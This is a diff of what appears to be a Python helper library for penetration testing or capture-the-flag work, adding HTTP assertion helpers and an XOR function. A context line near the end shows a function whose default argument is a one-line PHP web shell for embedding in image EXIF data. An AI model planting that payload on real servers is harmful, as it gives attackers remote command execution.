@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 
 import random
+import math
 import socket
+import itertools
 import netifaces as ni
 import string
 import sys
@@ -44,15 +46,20 @@ def exit_with_error(res, err):
     exit()
 
 def assert_status_code(res, status_code, err=None):
-    if res.status_code != status_code:
+    if type(status_code) == int and res.status_code != status_code:
         err = f"[-] '{res.url}' returned unexpected status code {res.status_code}, expected: {status_code}" if err is None else err
         exit_with_error(res, err)
+    elif hasattr(status_code, '__iter__') and res.status_code not in status_code:
+        err = f"[-] '{res.url}' returned unexpected status code {res.status_code}, expected one of: {','.join(status_code)}" if err is None else err
+        exit_with_error(res, err)
 
-def assert_header_present(res, header, err=None):
-    if header in res.headers:
+def assert_location(res, location, err=None):
+    assert_header_present(res, "Location")
+    location_header = res.headers["Location"].lower()
+    if location_header == location.lower():
         return
-        
-    err = f"[-] '{res.url}' did not return header: {header}" if err is None else err
+
+    err = f"[-] '{res.url}' returned unexpected location {location_header}, expected: {location}" if err is None else err
     exit_with_error(res, err)
 
 def assert_content_type(res, content_type, err=None):
@@ -64,6 +71,13 @@ def assert_content_type(res, content_type, err=None):
         return
 
     err = f"[-] '{res.url}' returned unexpected content type {content_type_header}, expected: {content_type}" if err is None else err
+    exit_with_error(res, err)
+
+def assert_header_present(res, header, err=None):
+    if header in res.headers:
+        return
+        
+    err = f"[-] '{res.url}' did not return header: {header}" if err is None else err
     exit_with_error(res, err)
 
 def openServer(address, ports=None):
@@ -148,6 +162,29 @@ def pad(x, n):
     if len(x) % n != 0:
         x  += (n-(len(x)%n))*b"\x00"
     return x
+
+def xor(a, b):
+    if len(a) == 0 or len(b) == 0:
+        return a
+
+    if len(a) < len(b):
+        a *= int(math.ceil((len(b)/len(a))))
+        a = a[0:len(b)]
+    elif len(b) < len(a):
+        b *= int(math.ceil((len(a)/len(b))))
+        b = b[0:len(a)]
+
+    if type(a) == str and type(b) == str:
+        return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(a, b) ])
+    else:
+        if type(a) != bytes:
+            a = a.encode()
+        if type(b) != bytes:
+            b = b.encode()
+
+        
+
+    return b"".join([bytes([c1 ^ c2]) for (c1,c2) in zip(a, b) ])
 
 def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):
     import exif
